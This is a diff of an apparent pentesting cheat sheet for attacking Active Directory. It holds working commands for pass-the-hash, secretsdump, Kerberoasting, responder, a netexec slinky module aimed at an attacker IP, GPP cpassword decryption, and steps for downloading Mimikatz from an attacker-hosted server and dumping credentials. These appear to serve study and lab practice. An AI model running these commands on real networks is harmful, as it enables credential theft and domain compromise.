@@ -108,7 +108,7 @@ sudo mitm6 -i eth0 -d {domain.local}
 #### Pass the Hash
 - Pash the hash with `impacket-psexec [username]@[ip] -hashes [hash]`
 
-## Active Directory: Post-Host Compromise
+## Active Directory: Post-Host Compromise (Lateral and Escalation)
 - This stage starts after you have an account particular those that are only regular users.
 
 **Process**
@@ -153,7 +153,7 @@ impacket-secretsdump {domain}.local/{username}:{Password}@{IP of user machine}
 - Once you get hashes, use this against all computers in the domain. Re-spray the network until you find vertical access.
 - Then crack the hashes with hashcat (Process listed above).
 
-## Active Directory: DC Attack
+## Active Directory: DC Attack (Post account compromise)
 
 ### Kerberoasting
 - Goal of Kerberoasting: Get Ticket Granting Service (TGS) and decrypt server's account hash.
@@ -223,3 +223,27 @@ sudo responder -I eth0 -dP
 ````bash
 netexec smb {target IP} -d {domain}.local -u {target user} -p {target password} -M slinky -o NAME=test SERVER={attacker IP}
 ````
+
+### GPP Attacks
+An old attack that relies on a default password loaded into the DC. It will be listed as a jumbled string and cPassword in a gpp xml file (Possibly named groups.xml). `gpp-decrypt {complex string of cPassword values "dafhajksdhfjkasdh/asdhfkjahdsfkjhadf"}`
+
+### Mimikatz
+This attack only works if you have access to the machine. So this is a post compromise attack. Also, big also, virus protection needs to be disabled.
+
+You need to load the mimikatz tool onto the target machine and run mimikatz.
+
+1. Typing `mimikatz` in kali will show you where the files are located. 
+
+2. Once you've identified the location cd into that directory and setup a python webserver `python3 -m http.server 8080`.
+
+3. From the target machine navigate to http://{attacker IP[:port]}
+
+4. Download the (4) files.
+
+5. From the target machine, run a cmd.exe as administrator, navigate to the folder with the (4) downloaded mimikatz files, run `mimikatz.exe`.
+
+6. From there use the tool to complete the attack. Some plases to start
+    - Set privelege mode to debug `privilege::debug`
+    - `sekurlsa::` This will show you what tools are available.
+
+## Active Directory: Post-domain pwning
